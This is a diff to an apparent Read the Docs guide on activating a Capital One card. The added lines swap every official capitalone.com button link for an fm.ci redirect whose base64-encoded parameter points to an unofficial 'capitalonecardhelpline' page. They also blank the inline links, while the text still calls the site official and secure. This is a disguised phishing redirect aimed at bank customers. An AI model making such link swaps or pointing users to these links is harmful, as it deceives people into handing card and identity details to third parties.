@@ -4,7 +4,7 @@ How to Activate Your Capital One Credit or Debit Card
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://capitalone.com/activate" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
+        <a href="https://fm.ci/?aHR0cHM6Ly9jYXBpdGFsb25lY2FyZGhlbHBsaW5lLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
             Activate Your Capital One Card
         </a>
     </div>
@@ -19,7 +19,7 @@ When you receive a new Capital One card—whether it’s your first card, a repl
 What You’ll Need Before Activating
 ----------------------------------
 
-Before visiting `capitalone.com/activate <https://capitalone.com/activate>`_, make sure you have:
+Before visiting `capitalone.com/activate <#>`_, make sure you have:
 
 - Your new Capital One credit or debit card in hand
 - Last 4 digits of your Social Security Number (for verification)
@@ -28,7 +28,7 @@ Before visiting `capitalone.com/activate <https://capitalone.com/activate>`_, ma
 Step-by-Step Guide to Activate Your Capital One Card
 -----------------------------------------------------
 
-1. **Go to** `capitalone.com/activate <https://capitalone.com/activate>`_  
+1. **Go to** `capitalone.com/activate <#>`_  
    This is the official Capital One card activation website.
 
 2. **Sign In to Your Account**  
@@ -50,7 +50,7 @@ Log in, select your card, and tap on “Activate Card.”
 My Experience Activating a Capital One Card
 -------------------------------------------
 
-When I received my first Capital One card in the mail, I was unsure how long activation would take. I followed the instructions printed on the card, which directed me to `capitalone.com/activate <https://capitalone.com/activate>`_. The site was easy to use—I signed into my account, entered the card number and security code, and my card was ready to use in less than two minutes. I appreciated not having to call a phone number or wait on hold. Since then, I’ve always used the online method for quick activation.
+When I received my first Capital One card in the mail, I was unsure how long activation would take. I followed the instructions printed on the card, which directed me to `capitalone.com/activate <#>`_. The site was easy to use—I signed into my account, entered the card number and security code, and my card was ready to use in less than two minutes. I appreciated not having to call a phone number or wait on hold. Since then, I’ve always used the online method for quick activation.
 
 FAQs
 ----
@@ -62,31 +62,31 @@ FAQs
 **A:** You should contact Capital One customer support immediately to report a lost or stolen card before activation.
 
 **Q: Can I use the same process to activate a replacement card?**  
-**A:** Yes, the steps at `capitalone.com/activate <https://capitalone.com/activate>`_ are the same for new and replacement cards.
+**A:** Yes, the steps at `capitalone.com/activate <#>`_ are the same for new and replacement cards.
 
 **Q: How long does activation take?**  
 **A:** Activation is usually instant once the required information is submitted correctly.
 
 **Q: Is it safe to activate my card online?**  
-**A:** Yes, `capitalone.com/activate <https://capitalone.com/activate>`_ is secure and encrypted. Always ensure you’re on the official Capital One website.
+**A:** Yes, `capitalone.com/activate <#>`_ is secure and encrypted. Always ensure you’re on the official Capital One website.
 
 Final Thoughts
 --------------
 
-Activating your Capital One credit or debit card doesn’t have to be a hassle. Just head over to `capitalone.com/activate <https://capitalone.com/activate>`_, follow the simple steps, and you’ll be ready to make purchases in no time. Whether you prefer the website or mobile app, Capital One provides a fast and secure way to get started.
+Activating your Capital One credit or debit card doesn’t have to be a hassle. Just head over to `capitalone.com/activate <#>`_, follow the simple steps, and you’ll be ready to make purchases in no time. Whether you prefer the website or mobile app, Capital One provides a fast and secure way to get started.
 
 ✅ **Quick Links:**
 
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://capitalone.com/activate" style="background-color:#28a745; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+        <a href="https://fm.ci/?aHR0cHM6Ly9jYXBpdGFsb25lY2FyZGhlbHBsaW5lLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==" style="background-color:#28a745; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
             🔗 Activate Capital One Card
         </a>
-        <a href="https://www.capitalone.com/support-center/" style="background-color:#007bff; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+        <a href="https://fm.ci/?aHR0cHM6Ly9jYXBpdGFsb25lY2FyZGhlbHBsaW5lLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==" style="background-color:#007bff; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
             🔗 Capital One Support Center
         </a>
-        <a href="https://www.capitalone.com/help-center/sign-in/forgot-password/" style="background-color:#6c757d; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+        <a href="https://fm.ci/?aHR0cHM6Ly9jYXBpdGFsb25lY2FyZGhlbHBsaW5lLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==" style="background-color:#6c757d; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
             🔗 Reset Capital One Password
         </a>
     </div>
